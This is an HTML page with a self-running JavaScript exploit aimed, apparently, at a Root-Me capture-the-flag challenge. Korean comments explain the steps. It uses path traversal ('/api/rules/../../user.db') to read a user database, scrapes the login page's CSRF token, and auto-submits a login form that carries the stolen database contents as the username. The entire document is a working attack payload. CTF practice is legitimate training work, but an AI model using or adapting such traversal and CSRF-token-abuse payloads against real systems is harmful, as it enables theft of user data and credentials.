<!DOCTYPE html>
<html>
<body>
    <script>
        const challengeUrl = 'http://challenge01.root-me.org:58039';

        async function start() {
            // 1. Path Traversal로 user.db 파일의 내용을 가져옵니다.
            const db_content_response = await fetch('/api/rules/../../user.db');
            const db_content = await db_content_response.text();

            // 2. 로그인 페이지에서 CSRF 토큰을 가져옵니다.
            const login_page_response = await fetch('/login');
            const login_page_text = await login_page_response.text();
            const csrfToken = login_page_text.match(/name="_csrf" value="([^"]+)"/)[1];

            // 3. user.db 내용을 username으로 하여 로그인 실패 폼을 만듭니다.
            const form = document.createElement('form');
            form.method = 'POST';
            form.action = '/login';
            form.innerHTML = `
                <input type="hidden" name="username" value="">
                <input type="hidden" name="password" value="fail">
                <input type="hidden" name="_csrf" value="${csrfToken}">
            `;
            form.elements.username.value = db_content; // value에 직접 삽입
            document.body.appendChild(form);
            form.submit();
        }
        start();
    </script>
</body>
</html>
